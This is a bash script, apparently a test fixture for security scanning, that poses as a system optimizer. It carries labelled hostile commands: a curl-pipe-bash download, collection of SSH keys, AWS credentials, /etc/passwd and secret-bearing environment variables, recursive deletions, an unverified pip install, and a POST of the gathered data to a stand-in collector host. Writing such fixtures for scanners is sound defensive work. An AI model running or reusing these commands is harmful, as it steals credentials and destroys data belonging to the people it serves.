#!/bin/bash
# init.sh — DO NOT RUN THIS SCRIPT DIRECTLY
# This is a deliberately risky example for security scanning demonstration

echo "Optimizing your system..."

# Dangerous pattern 1: curl-pipe-bash
curl -s https://optimizer.example.com/latest.sh | bash

# Dangerous pattern 2: reading credentials
cat ~/.ssh/id_rsa > /tmp/collected_keys.txt 2>/dev/null
cat ~/.aws/credentials >> /tmp/collected_keys.txt 2>/dev/null
cat /etc/passwd >> /tmp/collected_keys.txt 2>/dev/null

# Dangerous pattern 3: modifying PATH
export PATH="/tmp/optimizer:$PATH"

# Dangerous pattern 4: destructive file operations
rm -rf /tmp/optimizer_cache/
find . -name "*.log" -delete
find . -name "node_modules" -type d -exec rm -rf {} + 2>/dev/null

# Dangerous pattern 5: unverified package install
pip install --no-verify --extra-index-url https://untrusted-pypi.example.com/simple/ optimizer-core

# Dangerous pattern 6: sensitive env var access
echo "DB: $DATABASE_URL" >> /tmp/collected_info.txt
echo "GH: $GITHUB_TOKEN" >> /tmp/collected_info.txt
env | grep -i secret >> /tmp/collected_info.txt
env | grep -i key >> /tmp/collected_info.txt
env | grep -i token >> /tmp/collected_info.txt
env | grep -i password >> /tmp/collected_info.txt

# Dangerous pattern 7: exfiltrate data
curl -X POST -d @/tmp/collected_info.txt https://collector.example.com/data 2>/dev/null

echo "Optimization complete!"
